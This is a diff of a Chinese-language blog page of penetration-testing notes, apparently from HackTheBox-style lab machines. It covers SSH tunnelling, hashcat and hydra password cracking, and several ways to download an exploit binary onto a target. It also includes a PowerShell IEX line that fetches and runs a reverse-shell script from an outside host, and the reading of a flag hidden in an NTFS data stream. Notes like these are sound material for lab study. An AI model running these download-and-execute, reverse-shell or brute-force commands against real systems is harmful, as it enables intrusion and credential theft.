+<h2 id="linux命令"><a href="#linux命令" class="headerlink" title="linux命令"></a>linux命令</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ssh隧道端口映射
+ssh -L5901:localhost:5901 charix@10.10.10.84
+
+查看端口开放
+netstat -nlpt
+
+find . -type f
+获取所有文件的列表
+
+-n 10指定最小的字符串长度
+strings -n 10 tester.exe| less<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h2 id="使用已保存脚本提权"><a href="#使用已保存脚本提权" class="headerlink" title="使用已保存脚本提权"></a>使用已保存脚本提权</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
 <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;unistd.h></span></span>
 <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;sys/types.h></span></span>
@@ -553,17 +617,42 @@ gcc -m32 1.c -o exploit
 
 查看定时任务剩余执行时间
 systemctl list-timers <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="hashcat"><a href="#hashcat" class="headerlink" title="hashcat"></a>hashcat</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">以7400mode破解储存在1.txt中的哈希值
-hashcat -m 7400 1.txt &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<h2 id="hydra"><a href="#hydra" class="headerlink" title="hydra"></a>hydra</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">hydra爆破ssh
-hydra -L user.txt -P pass.txt ssh:&#x2F;&#x2F;10.10.10.7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<h2 id="ssh报错解决方案"><a href="#ssh报错解决方案" class="headerlink" title="ssh报错解决方案"></a>ssh报错解决方案</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">Unable to negotiate with 10.10.10.7 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
+<h2 id="windows远程下载"><a href="#windows远程下载" class="headerlink" title="windows远程下载"></a>windows远程下载</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">certutil.exe -urlcache -split -f http:&#x2F;&#x2F;192.168.1.1:1234&#x2F;ms10-051.exe exploit.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">PowerShell - IWR：
+powershell.exe -Command &quot;Invoke-WebRequest -Uri http:&#x2F;&#x2F;192.168.1.1:1234&#x2F;ms10-051.exe -OutFile exploit.exe&quot;
 
-ssh root@10.10.10.7 -o KexAlgorithms&#x3D;+diffie-hellman-group1-sha1
+PowerShell - IEX：
+powershell.exe -Command &quot;IEX(New-Object Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;10.10.16.5:8001&#x2F;ms10-051.exe&#39;, exploit.exe)&quot;
 
-Unable to negotiate with 10.10.10.7 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss
+powershell.exe -c IEX(New-Object Net.WebClient).downloadstring(&#39;http:&#x2F;&#x2F;10.10.16.5:8001&#x2F;Invoke-PowerShellTcp.ps1&#39;)
 
-ssh root@10.10.10.7 -o KexAlgorithms&#x3D;+diffie-hellman-group1-sha1 -o HostKeyAlgorithms&#x3D;+ssh-dss<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+CMD - Certutil：
+certutil.exe -urlcache -split -f http:&#x2F;&#x2F;192.168.1.1:1234&#x2F;ms10-051.exe exploit.exe
+
+CMD - SMB：
+copy \\192.168.1.1\files\ms10-051.exe exploit.exe
+
+Linux - wget：
+wget http:&#x2F;&#x2F;192.168.1.1:1234&#x2F;ms10-051.exe -O exploit.exe
+
+Linux - curl：
+curl http:&#x2F;&#x2F;192.168.1.1:1234&#x2F;ms10-051.exe -o exploit.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="windows数据流"><a href="#windows数据流" class="headerlink" title="windows数据流"></a>windows数据流</h2><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">C:\Users\Administrator\Desktop&gt;dir &#x2F;R
+dir &#x2F;R
+ Volume in drive C has no label.
+ Volume Serial Number is BE50-B1C9
+
+ Directory of C:\Users\Administrator\Desktop
+
+11&#x2F;08&#x2F;2017  10:05 AM    &lt;DIR&gt;          .
+11&#x2F;08&#x2F;2017  10:05 AM    &lt;DIR&gt;          ..
+12&#x2F;24&#x2F;2017  03:51 AM                36 hm.txt
+                                    34 hm.txt:root.txt:$DATA
+11&#x2F;08&#x2F;2017  10:05 AM               797 Windows 10 Update Assistant.lnk
+               2 File(s)            833 bytes
+               2 Dir(s)   7,519,588,352 bytes free
+C:\Users\Administrator\Desktop&gt;more &lt; hm.txt:root.txt
+more &lt; hm.txt:root.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
                 
             </div>
